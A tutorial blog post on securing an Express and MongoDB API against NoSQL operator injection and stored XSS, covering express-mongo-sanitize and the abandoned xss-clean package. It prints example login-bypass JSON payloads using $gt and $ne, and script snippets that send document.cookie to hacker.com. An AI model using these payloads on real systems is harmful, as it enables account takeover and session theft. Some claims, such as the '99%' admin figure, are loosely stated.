# Data Sanitization and the Frontend Boundary

Network shields (Helmet and Rate Limiting) are perfectly configured to stop volumetric and browser attacks.
But we have two massive vulnerabilities left before this API is truly production-ready.
If a hacker sends a package containing a bomb, and your server opens it without checking, the fortress still falls. We must build a Data Purifier to sanitize the mail, and we must open the CORS Gateway so your React frontend can actually get inside.

---

## Vulnerability 1: NoSQL Injection

Imagine your Login Controller does this:

```javascript
User.findOne({email: req.body.email, password: req.body.password});
```

A hacker doesn't know the password. So they send a MongoDB command inside the JSON body:

```json
{
  "email": "admin@startup.com",
  "password": {"$gt": ""}
}
```

Or even worse:

```json
{
  "email": {"$ne": null} // ANY email that isn't null!
}
```

### The Catastrophe:

Express uses `express.json()` to parse that body. It perfectly converts it into a V8 object.
When it hands that object to Mongoose, Mongoose reads the password field as: "Greater Than Nothing" (which is mathematically true for everything). Because every string is technically greater than nothing, Mongoose evaluates the password check as true! The database bypasses the password entirely, finds the Admin email, and logs the hacker in.

If searching user with email this will give the user although bcrypt will handle the password but it is dangerous.
Since every user in your database has an email that is "not null", MongoDB simply hands over the oldest user in your database.

_(99% of the time, the very first user created in a database is the Admin account)._

The server then tries to run `bcrypt.compare` against "doesn't-matter". It fails, but the hacker just successfully mapped out your database and discovered the Admin's exact email address in the error logs or timing attacks. Furthermore, if they inject `$ne` into a Password Reset route, they can reset the Admin's password without ever knowing it.

---

## The Solution

### 1. `mongoSanitize()` (`express-mongo-sanitize`)

- **The Threat:** NoSQL Injection
- **The Target:** Your MongoDB Database

It intercepts `req.body`, `req.query`, and `req.params`. It aggressively searches for any keys that start with a dollar sign (`$`) or contain a dot (`.`). If it finds them, it strips them out or deletes them entirely.

- **Hacker sends:** `{ "email": { "$ne": null } }`
- **mongoSanitize runs:** It sees the `$ne` and destroys it.
- **Your controller receives:** `{ "email": {} }` (The database is safe).

### 2. `xss()` (`xss-clean`)

- **The Threat:** Cross-Site Scripting (XSS)
- **The Target:** Other Users' Browsers

The XSS Purifier (`xss-clean()`) Unlike the other packages, `xss-clean` has practically zero configuration options. You don't pass an object into it. It is a brute-force memory scrubber.

Imagine you are building a blog platform. A hacker writes a new comment, but instead of writing "Great post!", they write this:

```html
<script>
  // A script that steals the reader's session token and sends it to the hacker
  fetch(
    "[https://hacker.com/steal?token=](https://hacker.com/steal?token=)" +
      document.cookie,
  );
</script>
```

If your server saves that exact text to the database, the next time an innocent user loads the blog post, their browser will see those `<script>` tags, assume it is part of the website's code, and execute it. The innocent user just got hacked.

**What the middleware does:**
It intercepts the incoming request and looks for HTML tags and malicious JavaScript. It then escapes them—meaning it translates the dangerous characters into harmless text symbols.

**Example Scenario:**

- **Hacker sends:** `<script>alert('hacked')</script>`
- **`xss()` runs:** It converts the brackets into HTML entities.
- **Your controller receives:** `&lt;script&gt;alert('hacked')&lt;/script&gt;`

Now, when that comment is saved to the database and sent back to the frontend, the browser won't execute it as code. It will just safely print the literal text `<script>alert('hacked')</script>` on the screen for everyone to laugh at.

Imagine a malicious user creates an account and sets their "First Name" to this:
`<script>fetch('http://hacker.com/steal-cookie?data=' + document.cookie)</script>`

If your database saves that string, and your frontend website later displays that "First Name" on the screen, the victim's browser will think it's actual code, execute it, and instantly steal their login session. That is an XSS attack.

### What `app.use(xss())` does

When you put this middleware in your Express app, it intercepts every incoming request (`req.body`, `req.query`, and `req.params`) and scrubs the data before it reaches your controller.

It looks for HTML tags and either deletes them or converts them into safe "HTML entities".

- **Input:** `<script>alert('bad')</script>`
- **Output:** `&lt;script&gt;alert('bad')&lt;/script&gt;`

Because the brackets are converted to safe text, the database saves the safe version, and the XSS attack is neutralized.

---

## 🚨 Why you should NOT use `xss-clean` today

While the concept is good, using `xss-clean` as global middleware is no longer considered an enterprise best practice for three major reasons:

**1. The package is dead:** The popular `xss-clean` npm package hasn't been updated in years and is largely considered abandoned. Relying on abandoned security packages is a massive risk.

**2. It destroys legitimate data:** Imagine you are building a blog platform or a coding forum (like StackOverflow). If a user legitimately tries to write a tutorial containing HTML or JavaScript snippets, `xss-clean` will silently mangle and destroy their post before it hits the database.

**3. XSS is a Frontend problem (Output Encoding):**
Modern security architecture dictates that the backend database should store exactly what the user typed (raw). The responsibility of preventing XSS falls entirely on the frontend when it displays the data.

- Modern frontend frameworks like React, Vue, and Angular automatically neutralize XSS by default. If you pass `<script>` into a React component, React safely renders it as pure text on the screen.

**The Modern Solution:**
Instead of using global XSS sanitization middleware, modern APIs protect themselves using **Input Validation**.
